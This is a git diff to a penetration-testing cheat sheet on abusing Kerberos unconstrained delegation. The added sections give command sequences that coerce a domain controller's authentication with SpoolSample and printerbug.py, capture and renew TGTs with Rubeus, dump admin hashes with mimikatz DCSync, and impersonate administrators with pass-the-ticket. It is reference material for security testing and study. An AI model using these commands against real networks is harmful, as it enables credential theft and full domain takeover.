@@ -8,8 +8,6 @@
 > **Warning**
 > Remember to coerce to a HOSTNAME if you want a Kerberos Ticket
 
-## SpoolService Abuse with Unconstrained Delegation
-
 The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.
 
 **Requirements**:
@@ -20,7 +18,7 @@ The goal is to gain DC Sync privileges using a computer account and the SpoolSer
 - User must not be in the **Protected Users** group
 - User must not have the flag **Account is sensitive and cannot be delegated**
 
-### Find delegation
+## Find delegation
 
 :warning: : Domain controllers usually have unconstrained delegation enabled.
 Check the `TRUSTED_FOR_DELEGATION` property.
@@ -54,6 +52,60 @@ Check the `TRUSTED_FOR_DELEGATION` property.
 - BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
 - Powershell Active Directory module: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`
 
+## Kerberoasting Unconstrained Delegation 
+
+* **Rubeus**                                                                                                                                                          
+  Monitor for New TGT's                                                                                                                                               
+  ```powershell                                                                                                                                                       
+  .\Rubeus.exe monitor /interval:5 /nowrap                                                                                                                            
+  ```                                                                                                                                                                 
+  Use the recieved ticket to access a resource                                                                                                                        
+  ```powershell                                                                                                                                                       
+  .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt                                                                                                   
+  ```                                                                                                                                                                 
+  If the above doesn't work, we use renew to get a brand new TGT instead of a TGS                                                                                       ```powershell                                                                                                                                                       
+  .\Rubeus.exe renew /ticket:<ticket> /ptt                                                                                                                            
+  ```
+
+## The Printer Bug (exploit w/ [SpoolSample POC](https://github.com/leechristensen/SpoolSample) & Rubeus
+
+> There is a bug in the Print System Remote protocol that can force a computer to authenticate to any computer in the domain, thus allowing us to capture the machine TGT
+
+* **We can use the [SpoolSample POC](https://github.com/leechristensen/SpoolSample) to accomplish this**
+
+### Execution
+  Note: 2 computers, sql01 & DC01
+  From SQL01:
+  ```powershell
+  .\Rubeus.exe monitor /interval:5 /nowrap
+  ```
+  Open another PS windowson SQL01
+  ```powershell
+  #Syntax
+  .\SpoolSample.exe <TargetServer> <CaptureServer>
+  # Example
+  .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+  ```
+  Renew the captured TGT w/ Rubeus
+  ```powershell
+  .\Rubeus.exe renew /ticket:<ticket> /ptt
+  ```
+  If we manage to capture the tgt, we can perform a DCSync and pwn the domain
+
+Example
+  Dumping an admin user w/ mimikatz
+  ```powershell
+  mimikatz.exe
+  mimikatz > lsadump::dcsync /user:<Admin Username>
+  ```
+  Rubeus to request a ticket as that admin user
+  ```powershell
+  .\Rubeus.exe asktgt /rc4:<NTLM hash> /user:<admin username> /ptt
+  ```
+  We can now use this ticket to impersonate the administrative user.
+
+## SpoolService Abuse with Unconstrained Delegation Using SpoolSample, krbrelayx, & dementor
+
 ### SpoolService status
 
 Check if the spool service is running on the remote host
@@ -68,22 +120,22 @@ python rpcdump.py DOMAIN/user:password@10.10.10.10
 Monitor incoming connections from Rubeus.
 
 ```powershell
-Rubeus.exe monitor /interval:1 
+.\Rubeus.exe monitor /interval:5 /nowrap
 ```
 
 ### Force a connect back from the DC
 
 Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.
 
-> SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.
+> [SpoolSample PoC](https://github.com/leechristensen/SpoolSample) is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.
 
 ```powershell
-# From https://github.com/leechristensen/SpoolSample
 .\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
 .\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
 # DC01.HACKER.LAB is the domain controller we want to compromise
 # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.
 
+### krbrelayx
 # From https://github.com/dirkjanm/krbrelayx
 printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>
 
